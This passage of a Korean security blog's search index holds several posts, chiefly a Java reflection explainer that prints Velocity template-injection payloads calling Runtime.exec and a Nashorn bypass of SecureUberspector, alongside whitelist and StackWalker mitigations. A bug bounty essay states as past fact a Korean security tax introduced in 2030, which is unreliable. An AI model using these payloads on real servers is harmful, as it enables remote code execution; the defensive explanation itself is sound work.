기밀성과 무결성이 서버 간 전송 중에도 유지됩니다. 이 설계에는 공격자, 애플리케이션 사용자 또는 데스크탑 사용자가 구성 데이터를 변경하지 못하도록 하는 예방 조치도 포함되어 있습니다.\nCitrix가 위에 언급된 보안 기능들을 구현했음에도 불구하고, 특히 대한민국과 같이 엄격한 네트워크 격리 법규가 적용되는 지역에서는 법적 고려사항도 반드시 검토되어야 합니다.\nCitrix의 보안 목표인 O.Secure_Setup_Data, OE.TLS, OE.Encryption 등은 서버 간 처리 및 전송 중에 구성 데이터의 기밀성과 무결성을 보장합니다.\n자세한 보안 목표와 관리 기능의 역할에 대해서는 다음을 참조하세요:\nFMT_SMF.1/Authorise: 엔드포인트 데이터 접근 제어 정책 관리 FMT_MSA.1/Desktop FMT_MSA.3/Desktop FMT_MSA.1/Application FMT_MSA.3/Application FPT_ITT.1 법적 고려사항 대한민국에서는 전자금융거래법에 따라 금융감독원이 논리적 네트워크 분리를 선택적으로 구현할 수 있는 조치를 도입하였습니다. 금융 기관은 민감한 데이터가 외부 공격으로부터 보호받도록 네트워크 격리 조치를 채택하여 무단 접근을 차단하고 사고를 예방해야 합니다.\n해당 공격은 관리자 권한이 필요하므로, 기업은 논리적으로 분리된 네트워크 환경에서 PC 사용자에 대한 관리자 권한 제거 정책을 재검토해야 합니다. 또한, 이러한 시스템의 오남용을 방지할 수 있는 규정을 포함하도록 법적 개선이 필요합니다.\n한계 관리자 권한 및 설치 권한이 제한되더라도, 화면 캡처 등의 방법으로 인한 데이터 유출을 완전히 방지하기는 어렵습니다. 논리적 네트워크 격리 모델에 대한 보다 자세한 분석과 해결책은 이 보고서에서 확인할 수 있습니다.\n이러한 한계는 관리자 권한이 제거된 경우에도 조직이 여전히 취약함을 시사하며, 최근 은행 부문에서 유사 사건에 대응하는 사례에서도 보듯이, 기술적 및 규제적 차원에서 이러한 문제들을 해결하는 것이 중요함을 강조합니다.\n관련 이슈 2011년 농협 해킹 사건 이후, 대한민국의 여러 주요 은행은 개인 정보의 유출, 절도 또는 변조를 방지하기 위해 내부-외부 네트워크 분리를 시행하기 시작했습니다. 네트워크 격리는 개인 데이터의 안전을 보장하기 위한 핵심 권고사항으로 남아 있습니다. 관련 지침은 여기에서, ISMS-P 인증 관련 정보는 여기에서 확인할 수 있습니다.\n추가로 Citrix Common Criteria 인증에 관한 정보는 여기와 여기에서 확인할 수 있습니다.\n","permalink":"https://windshock.github.io/ko/post/2023-04-27-bypassing-citrix-policy-is-not-a-vulnerability-but-it-can-be-a-violation-of-the-law/","summary":"\u003ch3 id=\"시트릭스-정책-우회는-취약점이-아니라-법률-위반이다\"\u003e시트릭스 정책 우회는 취약점이 아니라 법률 위반이다\u003c/h3\u003e\n\u003ch4 id=\"주의\"\u003e주의!!\u003c/h4\u003e\n\u003cp\u003ecert.org의 \u003ca href=\"https://kb.cert.org/vince/comm/case/1022/\"\u003eVINCE\u003c/a\u003e를 통한 Citrix와의 논의를 바탕으로, 이 문제는 관리 권한이 필요하기 때문에 취약점으로 분류되지 않는 것으로 결론지어졌습니다. 따라서 보안상의 문제 없이 이 정보를 공유할 수 있습니다. 그러나 보안상의 이유로, 논리적으로 격리되거나 폐쇄된 네트워크와 같은 특수 환경에서는 Xendesktop (VDI)의 사용을 권장하지 않습니다. 만약 VDI를 반드시 사용해야 한다면, 관리자 권한을 제거하고 보안 전용 소프트웨어를 설치해야 합니다.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e관리자 권한이 필요하다는 점은 위험을 낮출 수 있지만, 잠재적인 영향력을 완전히 제거하지는 않습니다. 아래는 Citrix 정책이 어떻게 우회될 수 있는지에 대한 상세한 기술 설명입니다.\u003c/strong\u003e\u003c/p\u003e","title":"시트릭스 정책 우회는 취약점이 아니라 법률 위반이다"},{"content":"정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화: 보안세와 그 실행 사례 살펴보기\n오늘날의 디지털 시대에서 정보 보안은 개인, 기업, 그리고 정부 모두에게 중요한 이슈가 되었습니다. 사이버 공격과 데이터 유출이 점점 더 빈번해지고 정교해지면서 그 결과는 매우 치명적일 수 있습니다. 이러한 위협에 대비하기 위해 강력한 사이버 보안 대책을 마련하는 것이 필수적입니다.\n최근 인기를 얻고 있는 한 가지 접근 방식은 정부 NGO(비정부기구)와 버그 바운티 프로그램의 활용입니다. 이 프로그램들은 개인과 조직이 디지털 시스템의 취약점과 약점을 식별하고 신고하도록 장려하여, 적시에 효과적인 대응을 가능하게 합니다. 이들은 포괄적인 사이버 보안 전략의 핵심 요소로서, 그 중요성은 아무리 강조해도 지나치지 않습니다.\n일부 국가에서는 이러한 프로그램을 지원하기 위해 보안세를 도입하기도 했습니다. 이 보안세는 사이버 공격 위험이 높은 기업에 부과되며, 그 수익은 정부 NGO와 버그 바운티 프로그램을 설립 및 지원하는 데 사용됩니다. 이 접근 방식은 다소 논란의 여지가 있지만, 사이버 위협에 대비하기 위해 필요한 자금을 마련하는 데 효과적임은 부정할 수 없습니다.\n예를 들어, 보안세를 도입한 국가 중 하나는 대한민국입니다. 2030년에 대한민국 정부는 사이버 공격 위험이 높은 기업에 대해 보안세를 도입하였습니다. 이 세금은 기업의 연간 매출에 따라 0.09%에서 2%까지 부과되며, 기업의 규모와 위험 수준에 따라 차등 적용됩니다. 세금 수익은 국가 사이버 보안 기관 및 다양한 정부 NGO와 버그 바운티 프로그램을 지원하는 데 사용됩니다.\n이와 같은 맥락에서 NGO의 중요성은 매우 큽니다. NGO는 사이버 보안 분야에서 정부와 민간 부문 간의 격차를 메우는 역할을 하며, 기술적 측면의 보안 문제를 보다 효과적으로 처리할 수 있습니다. 이들은 기업 및 조직과 긴밀하게 협력하여 시스템의 취약점과 약점을 식별하고, 정부와의 파트너십을 통해 사이버 위협에 대응하는 데 중요한 역할을 수행합니다.\n정부 NGO와 버그 바운티 프로그램의 역할과 책임(R\u0026amp;R)은 국가와 프로그램에 따라 다를 수 있습니다. 일반적으로 정부 NGO는 사이버 보안 위협에 대한 연구 및 분석을 수행하고, 모범 사례와 가이드라인을 개발하는 역할을 맡습니다. 또한, 기업과 조직에 이러한 모범 사례를 구현할 수 있도록 지침과 지원을 제공하기도 합니다.\n반면, 버그 바운티 프로그램은 개인과 조직이 디지털 시스템의 취약점을 식별하고 신고하도록 유도하기 위해 설계되었습니다. 이 프로그램들은 유효한 취약점을 발견해 신고한 이들에게 현금 등으로 보상함으로써, 사이버 범죄자들이 취약점을 악용하기 전에 이를 찾아내고 해결하는 데 매우 효과적임이 입증되었습니다.\n또한, 이러한 프로그램들은 개인에게 보안세를 부과해서는 안 되며, 보안세 부담은 사이버 공격 위험이 높은 기업과 조직에 있어야 합니다.\n요약하자면, 보안세, NGO, 그리고 버그 바운티 프로그램은 점점 더 복잡해지는 위협 환경 속에서 사이버 보안을 강화하기 위한 중요한 도구들입니다. 정부 기관, NGO, 그리고 민간 기업이 함께 협력함으로써, 취약점을 신속하고 효과적으로 식별 및 해결하여 비용이 많이 들고 파괴적인 사이버 공격의 위험을 줄일 수 있습니다.\n","permalink":"https://windshock.github.io/ko/post/2023-04-18-strengthening-cybersecurity-through-government-ngos-and-bug-bounty-programs/","summary":"\u003cp\u003e정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화: 보안세와 그 실행 사례 살펴보기\u003c/p\u003e\n\u003cp\u003e오늘날의 디지털 시대에서 정보 보안은 개인, 기업, 그리고 정부 모두에게 중요한 이슈가 되었습니다. 사이버 공격과 데이터 유출이 점점 더 빈번해지고 정교해지면서 그 결과는 매우 치명적일 수 있습니다. 이러한 위협에 대비하기 위해 강력한 사이버 보안 대책을 마련하는 것이 필수적입니다.\u003c/p\u003e\n\u003cp\u003e최근 인기를 얻고 있는 한 가지 접근 방식은 정부 NGO(비정부기구)와 버그 바운티 프로그램의 활용입니다. 이 프로그램들은 개인과 조직이 디지털 시스템의 취약점과 약점을 식별하고 신고하도록 장려하여, 적시에 효과적인 대응을 가능하게 합니다. 이들은 포괄적인 사이버 보안 전략의 핵심 요소로서, 그 중요성은 아무리 강조해도 지나치지 않습니다.\u003c/p\u003e","title":"정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화"},{"content":"자바 리플렉션의 보안 위협과 완화 전략 자바 리플렉션 API는 런타임에 클래스, 메서드, 인터페이스를 동적으로 조작할 수 있게 해주는 강력한 도구입니다. 하지만 그 유연성 때문에 공격자가 이를 악용해 시스템에 무단 접근할 수 있는 심각한 보안 위험이 발생합니다. 본 문서에서는 자바 리플렉션이 야기하는 보안 위협을 살펴보고, 이러한 위험을 완화하기 위한 전략들을 설명합니다.\n리플렉션 API 사용 시의 위험성 리플렉션은 객체의 구조를 검사하거나 런타임에 메서드를 동적으로 호출하는 데 일반적으로 사용됩니다. 그러나 적절한 **보안 관리자(Security Manager)**가 없는 경우, execute, eval 등과 같은 민감한 메서드에 접근할 수 있어 잠재적인 원격 코드 실행(RCE) 공격을 유발할 수 있습니다.\n예를 들어, 아래 코드는 시스템 명령어를 실행하기 위해 리플렉션을 사용하는 위험성을 보여줍니다:\n#set($exp=\u0026#34;test\u0026#34;) $exp.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;, null) .invoke(null, null) .exec(\u0026#34;calc\u0026#34;) 이 코드는 Velocity 템플릿 엔진과 리플렉션을 사용하여 시스템 명령어를 실행하는데, 적절한 보안 조치가 마련되지 않은 경우 공격자에 의해 악용될 수 있습니다. 다행히도, Java 9에서는 이러한 위험을 완화하기 위한 보안 메커니즘이 강화되었습니다.\nJava 9와 StackWalker API Java 9에서는 기존의 Reflection.getCallerClass 메서드가 더 이상 사용되지 않고, 대신 StackWalker API가 도입되었습니다. 이 API는 호출 클래스를 검사하는 보다 안전한 방법을 제공합니다. 이전에는 보안 검사가 바로 직전 호출자에 대해서만 수행되었지만, StackWalker를 사용하면 전체 호출 스택을 검사하여 보다 포괄적인 보안을 확보할 수 있습니다.\n자세한 내용은 Stack Walking API 가이드를 참고하세요. 이 방법은 호출 체인 전체에 걸친 잠재적 취약점을 모두 해결하도록 돕는데, 이는 CVE-2012-4681 취약점 사례에서도 확인할 수 있습니다. 이 취약점에서는 자바의 호출자 민감 메서드가 악용되어 공격이 발생했으나, Java 8 이후로 @CallerSensitive 애노테이션을 통해 이러한 메서드를 보호할 수 있게 되었습니다.\n블랙리스트 기반 보안의 문제점과 화이트리스트의 필요성 전통적인 블랙리스트 기반 보안 접근 방식은 특정 위험 요소를 차단하는 데 초점을 맞추지만, 모든 공격 벡터를 포괄하지 못하는 한계가 있습니다. 예를 들어, 특정 메서드나 클래스를 블랙리스트에 올려도, 공격자는 차단되지 않은 다른 대체 방법을 사용하여 우회할 수 있습니다.\n표현 언어 주입(Expression Language Injection) 및 기타 동적 코드 실행 공격은 이러한 한계를 자주 악용합니다. Blackhat JSON Attacks에서처럼, 블랙리스트 필터링 방식은 우회될 수 있으며, 공격자는 차단되지 않은 경로를 통해 악의적인 명령어를 실행할 수 있습니다.\n이러한 이유로 화이트리스트 접근 방식이 일반적으로 더 효과적입니다. 화이트리스트 방식은 명시적으로 신뢰할 수 있는 클래스와 메서드만 접근을 허용하고 기본적으로 나머지를 모두 차단하므로, 승인되지 않은 메서드나 리플렉션 기반 공격을 통한 코드 실행 위험을 크게 줄일 수 있습니다.\nSecureUberspector의 역할과 한계 Apache Velocity의 SecureUberspector는 클래스 로딩과 리플렉션을 제한하는 도구로, 특히 신뢰할 수 없는 다수의 템플릿 작성자가 관여하는 경우에 유용합니다. 이는 임의의 객체 실행과 해당 객체에 대한 리플렉션을 차단하여 보안을 강화합니다. 그러나 한계가 존재합니다.\n예를 들어, CVE-2019-17558에서 SecureUberspector는 모든 리플렉션 기반 공격을 완전히 차단하지 못했습니다. 특히, javax.script.ScriptEngineManager의 사용을 막지 못해, 이를 통해 임의의 코드 실행이 가능해졌습니다. GHSL-2020-048에서는 공격자가 이 취약점을 이용하여 SecureUberspector를 우회하는 방법을 보여줍니다:\n#set($engine = $scriptEngineManager.getEngineByName(\u0026#34;nashorn\u0026#34;)) #engine.eval(\u0026#34;java.lang.Runtime.getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;) 이 스크립트는 SecureUberspector를 우회하여 원격 명령어 실행을 가능하게 합니다. 마찬가지로, 공격자는 SecureLayer7 분석에서 언급된 바와 같이 Groovy 스크립트를 사용해 보안 메커니즘을 우회할 수 있습니다.\n화이트리스트 적용: 구체적인 전략 화이트리스트는 신뢰할 수 있는 클래스, 메서드, 객체만 허용하고 그 외는 모두 차단하는 보안 모델로, 선호되는 방식입니다. 아래는 자바에서 화이트리스트를 적용하는 구체적인 방법들입니다.\n보안 관리자(Security Manager) 사용\n자바 보안 관리자를 사용하면 민감한 리소스에 대한 접근을 제한하고 특정 클래스나 메서드만 실행할 수 있도록 할 수 있습니다.\nSystem.setSecurityManager(new SecurityManager()); // 신뢰할 수 있는 메서드/클래스에 대한 권한 정의 PermissionCollection perms = new Permissions(); perms.add(new RuntimePermission(\u0026#34;accessDeclaredMembers\u0026#34;)); // 리플렉션 접근 허용 perms.add(new RuntimePermission(\u0026#34;createClassLoader\u0026#34;)); // 클래스 로더 생성 허용 AccessController.doPrivileged(new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { // 화이트리스트에 포함된 메서드 내에서만 실행 secureMethod(); return null; } }, new AccessControlContext(new ProtectionDomain[] {new ProtectionDomain(null, perms)})); 리플렉션을 통한 접근 제어\n리플렉션 사용 시, 특정 클래스와 메서드에 대한 접근을 수동으로 제한하여 명시적으로 허용되지 않은 경우 접근을 거부할 수 있습니다.\nprivate static final Set\u0026lt;String\u0026gt; allowedMethods = Set.of( \u0026#34;java.lang.String\u0026#34;, \u0026#34;java.util.List\u0026#34; // 화이트리스트에 포함된 클래스 ); public static Object invokeMethod(Method method, Object target, Object... args) throws Exception { if (!allowedMethods.contains(method.getDeclaringClass().getName())) { throw new SecurityException(\u0026#34;Unauthorized method invocation: \u0026#34; + method.getName()); } return method.invoke(target, args); // 화이트리스트에 포함된 메서드만 실행 } 스크립트 엔진에서의 화이트리스트 적용\njavax.script.ScriptEngineManager와 같은 스크립트 엔진도 화이트리스트를 구현하여 안전한 스크립트나 명령어만 실행되도록 할 수 있습니다.\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\u0026#34;nashorn\u0026#34;); engine.setBindings(new SimpleBindings(allowedMethods), ScriptContext.ENGINE_SCOPE); // 화이트리스트 적용 engine.eval(\u0026#34;some safe script here\u0026#34;); 템플릿 엔진에서의 화이트리스트 적용\nSecureUberspector와 같은 도구는 템플릿 엔진 내에서 신뢰할 수 있는 메서드와 객체에 대한 접근을 제한하는 화이트리스트 방식을 강제하도록 설정할 수 있습니다.\npublic Iterator getIterator(Object obj, Info i) { if (obj != null) { SecureIntrospectorControl sic = (SecureIntrospectorControl) introspector; if (sic.checkObjectExecutePermission(obj.getClass(), null)) { return super.getIterator(obj, i); } else { log.warn(\u0026#34;보안 제한으로 인해 \u0026#34; + obj.getClass() + \u0026#34;에서 iterator를 가져올 수 없습니다.\u0026#34;); } } return null; } StackWalker를 통한 보호: 호출자 검증 Java 9에서 도입된 StackWalker API는 호출 스택을 검사하는 안전한 방법을 제공하여, 메서드 호출에 대한 더 나은 제어를 가능하게 합니다. StackWalker를 사용하면 메서드가 신뢰할 수 있는 호출자에 의해서만 호출되는지 확인할 수 있습니다.\n다음은 StackWalker를 사용하여 메서드의 호출자를 검증하는 예제입니다:\nimport java.lang.StackWalker; import java.util.List; import java.util.Set; import java.util.stream.Collectors; public class SecurityManagerUtil { // 화이트리스트에 포함된 호출자 클래스 private static final Set\u0026lt;String\u0026gt; allowedCallers = Set.of(\u0026#34;com.example.TrustedClass\u0026#34;); public static void checkCaller() { List\u0026lt;String\u0026gt; stackTrace = StackWalker.getInstance(StackWalker.Option.RETAIN_CLASS_REFERENCE) .walk(frames -\u0026gt; frames.map(frame -\u0026gt; frame.getDeclaringClass().getName()) .collect(Collectors.toList())); // 호출자가 화이트리스트에 포함되지 않은 경우 예외 발생 boolean isCallerAllowed = stackTrace.stream().anyMatch(allowedCallers::contains); if (!isCallerAllowed) { throw new SecurityException(\u0026#34;Unauthorized caller detected: \u0026#34; + stackTrace); } } public static void secureMethod() { checkCaller(); // 실행 전 호출자 검증 System.out.println(\u0026#34;Secure method executed.\u0026#34;); } } 이 예제는 신뢰할 수 있는 클래스만이 secureMethod()를 호출할 수 있도록 보장합니다. 만약 허가되지 않은 클래스가 메서드에 접근하려 할 경우, 예외가 발생합니다.\n결론: 리플렉션의 올바른 사용과 보호 자바 리플렉션 API는 유연하고 강력한 도구이지만, 특히 Velocity와 같은 템플릿 엔진과 결합될 경우 심각한 보안 위험을 초래합니다. 블랙리스트 기반 접근 방식은 우회될 가능성이 높지만, 화이트리스트 방식은 신뢰할 수 있는 요소만 실행되도록 하여 더 강력한 보호를 제공합니다. 또한, StackWalker API를 활용하면 메서드 호출을 검증하고 무단 접근을 차단하여 보안을 한층 강화할 수 있습니다.\n화이트리스트와 StackWalker와 같은 도구를 결합함으로써, 자바 애플리케이션을 리플렉션 기반 공격에 대해 더욱 안전하고 견고하게 만들 수 있습니다.\n","permalink":"https://windshock.github.io/ko/post/2019-09-03-security-threats-and-mitigation-strategies-for-java-reflection/","summary":"\u003ch3 id=\"자바-리플렉션의-보안-위협과-완화-전략\"\u003e자바 리플렉션의 보안 위협과 완화 전략\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e자바 리플렉션 API\u003c/strong\u003e는 런타임에 클래스, 메서드, 인터페이스를 동적으로 조작할 수 있게 해주는 강력한 도구입니다. 하지만 그 유연성 때문에 공격자가 이를 악용해 시스템에 무단 접근할 수 있는 심각한 보안 위험이 발생합니다. 본 문서에서는 자바 리플렉션이 야기하는 보안 위협을 살펴보고, 이러한 위험을 완화하기 위한 전략들을 설명합니다.\u003c/p\u003e\n\u003ch4 id=\"리플렉션-api-사용-시의-위험성\"\u003e리플렉션 API 사용 시의 위험성\u003c/h4\u003e\n\u003cp\u003e리플렉션은 객체의 구조를 검사하거나 런타임에 메서드를 동적으로 호출하는 데 일반적으로 사용됩니다. 그러나 적절한 **보안 관리자(Security Manager)**가 없는 경우, \u003ccode\u003eexecute\u003c/code\u003e, \u003ccode\u003eeval\u003c/code\u003e 등과 같은 민감한 메서드에 접근할 수 있어 잠재적인 \u003cstrong\u003e원격 코드 실행(RCE)\u003c/strong\u003e 공격을 유발할 수 있습니다.\u003c/p\u003e","title":"자바 리플렉션의 보안 위협과 완화 전략"},{"content":"Chrome에서 XSSAudit 기능이 제거하는 이유? Google 보안팀에서는 Chrome 개발팀에게 XSSAudit 기능을 제거하자는 제안을 했지만, Google 보안팀이 제시한 근거는 우회 가능하다는 내용( evn@google.com의 논문)뿐이라 제거까지 가지 않을 것 같았지만, Chrome version 에서는 완전히 제외되는 것으로 결정되었습니다.\n논문의 주요 내용은 신규 javascript framework의 garget을 이용한 우회 방법은 방어하기 어려우므로, 기존 완화하는 방법(xssaudit filter)에서 격리/예방하는 방법(Content Security Policy, 이하 CSP)으로 변화하자는 것이 주요 내용입니다.\nXSSAudit은 유용하지 않았던가? Google과 같은 업체 입장에서는 XSSAudit 기능에 의해 유지 비용이 소모되고 경쟁 업체(MS 등) 브라우저보다 성능이 느려진다면, 이 기능은 제거하고 싶은 것이 당연할 겁니다. (실제로 MS EDGE에서 해당 기능을 제거하였습니다.)\n모의해커 등 공격자 입장에서는 매우 비정상적인 상황에서만 XSSAudit 우회가 가능하므로 해당 기능을 매우 귀찮고 성가신 존재입니다.\n보안 담당자 등 방어자 입장에서는 적용하기 어려운 CSP를 도입해야 하므로 업무적으로 피곤하게 됩니다. 또한 CSP도 완벽한 방어 방법은 아닙니다. # Content Security Policy Level 2 RFP의 내용에서도 CSP는 방어를 강화하는 한가지 방식으로 기술하고 있습니다.\nContent Security Policy (CSP) is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth, to reduce the harm caused by content injection attacks. As a first line of defense against content injection, server operators should validate their input and encode their output.\n구글 등 브라우저 개발사 외에는 모두 유용했던 기능인데 제거하려는 이유가 우회된다는 것 뿐이라면, 업체 중심적인 의사 결정으로 보입니다. Google은 Don\u0026rsquo;t be evil, Do the right thing 아니었나요?\n어떻게 되었든 CSP 도입으로 공부를 많이 해야 합니다. ㅠㅠ How do I Content Security Policy So we broke all CSPs …\n","permalink":"https://windshock.github.io/ko/post/2019-08-08-about-the-xssaudit/","summary":"\u003ch2 id=\"chrome에서-xssaudit-기능이-제거하는-이유\"\u003eChrome에서 XSSAudit 기능이 제거하는 이유?\u003c/h2\u003e\n\u003cp\u003eGoogle 보안팀에서는 Chrome 개발팀에게 \u003ca href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=898081\"\u003eXSSAudit 기능을 제거하자는 제안\u003c/a\u003e을 했지만, Google 보안팀이 제시한 근거는 우회 가능하다는 내용( \u003ca href=\"mailto:evn@google.com\"\u003eevn@google.com\u003c/a\u003e의 논문)뿐이라 제거까지 가지 않을 것 같았지만, \u003ca href=\"https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/TuYw-EZhO9g/blGViehIAwAJ\"\u003eChrome version 에서는 완전히 제외\u003c/a\u003e되는 것으로 결정되었습니다.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"/pdf/p1709-lekiesA.pdf\"\u003e논문\u003c/a\u003e의 주요 내용은 신규 javascript framework의 garget을 이용한 우회 방법은 방어하기 어려우므로, 기존 완화하는 방법(xssaudit filter)에서  격리/예방하는 방법(Content Security Policy, 이하 CSP)으로 변화하자는 것이 주요 내용입니다.\u003c/p\u003e\n\u003ch2 id=\"xssaudit은-유용하지-않았던가\"\u003eXSSAudit은 유용하지 않았던가?\u003c/h2\u003e\n\u003cp\u003eGoogle과 같은 업체 입장에서는 XSSAudit 기능에 의해 유지 비용이 소모되고 경쟁 업체(MS 등) 브라우저보다 성능이 느려진다면, 이 기능은 제거하고 싶은 것이 당연할 겁니다. (실제로 MS EDGE에서 해당 기능을 제거하였습니다.)\u003c/p\u003e","title":"About the XSSAudit"},{"content":"🚀 보안 취약점 분석가 및 보안 자동화 전문가 🚀\n17년 이상의 경험을 바탕으로 취약점 분석, 안전한 코딩, 자동화된 보안 솔루션 구축에 집중하고 있습니다. 제 작업은 조직이 보안 문제를 더 빠르고 효과적으로 해결할 수 있도록 코드화된 보안 솔루션을 제공하는 데 중점을 둡니다. 주요 보안 원칙을 따르며, 개발 과정 초기에 보안을 통합하는 시프트-레프트 접근 방식을 강조하고, 데이터 기반 보안을 활용하여 더 스마트한 시스템을 구축합니다.\n🔑 시프트-레프트 - 개발자 및 이해관계자를 위한 안전한 코딩 지침: 보안은 개발 과정 초기에 통합되어야 합니다. 이를 위해 개발자와 비즈니스 이해관계자를 대상으로 한 안전한 코딩 지침을 제공하여 취약점을 즉시 해결할 수 있도록 지원합니다. 이러한 지침은 개발 초기 단계부터 보안을 강화하여 시프트-레프트 접근 방식을 촉진합니다.\n🔑 보안 자동화 - 자동화된 보안 솔루션 구축: 오늘날의 개발 환경에서 보안 자동화는 필수적입니다. DevSecOps 환경 내에서 자동화된 보안 솔루션을 구축하여 개발 파이프라인에 보안을 원활하게 통합했습니다. 자동화된 악성코드 탐지 및 보안 로그 분석을 통해 수작업을 크게 줄이고 보안 위협에 대한 대응 시간을 최소화했습니다.\n🔑 데이터 기반 보안 - Fortify를 활용한 취약점 클러스터링 및 이상 트래픽 분석: 데이터 기반 보안에 집중하여 Fortify를 사용한 취약점 클러스터링 및 이상 트래픽 분석 도구를 개발했습니다. 이러한 도구는 보안 취약점에 대한 더 빠르고 체계적인 분석과 대응을 가능하게 하여 다양한 환경에서 보안 문제를 사전에 예방합니다.\n🔑 재능 기부 - CVE, CWE 보고 및 GitHub 도구 공유: 보안 커뮤니티에 적극 기여하며 CVE 및 CWE 취약점을 보고합니다. 또한 이러한 취약점을 해결하기 위한 도구를 개발하여 GitHub에 공유합니다. 이러한 재능 기부는 글로벌 보안 생태계를 강화하고 조직이 중요한 보안 문제를 해결하는 데 도움을 줍니다.\n📧 Email: windshock@gmail.com\n🔗 Website: https://windshock.github.io/\n💼 LinkedIn: https://www.linkedin.com/in/windshock/\n","permalink":"https://windshock.github.io/ko/about/","summary":"보안 자동화와 취약점 분석 전문가입니다.","title":"소개"}]